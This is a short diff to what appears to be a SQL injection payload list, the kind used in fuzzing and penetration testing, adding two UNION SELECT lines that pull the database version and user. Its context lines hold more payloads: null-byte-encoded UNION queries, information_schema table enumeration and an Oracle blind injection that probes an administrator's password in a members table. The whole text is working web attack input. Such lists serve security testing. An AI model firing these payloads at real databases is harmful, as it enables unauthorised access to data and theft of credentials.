@@ -465,3 +465,5 @@ ANY((SELECT 1)) - 1 UNION ALL --
 1%00UNION%00SELECT%002--
 stringindatasetchoosen%25' and 1 = any (select 1 from SECURE.CONF_SECURE_MEMBERS where FULL_NAME like '%25dministrator' and rownum<=1 and PASSWORD like '0%25') and '1%25'='1
 -{``.``.id} union select table_name FROM information_schema.tables LIMIT 1
+-1 UNION select version(), user(), 3 --
+-1 UNION select user(), version(), 3 --
